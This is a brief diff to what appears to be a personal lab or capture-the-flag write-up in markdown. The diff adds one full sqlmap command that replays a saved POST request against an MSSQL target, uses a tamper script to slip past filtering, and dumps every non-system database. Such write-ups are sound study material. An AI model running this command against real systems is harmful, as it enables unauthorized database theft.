@@ -125,3 +125,9 @@ and guess what we got an error
 ```
 ![[Pasted image 20240919184507.png]]
 
+
+```
+sqlmap -r post_me.txt --tamper=charunicodeescape --delay 3 --level 5 --risk 3 --dbms=mssql -technique=U --batch --dump-all --exclude-sysdbs -v 3
+```
+
+
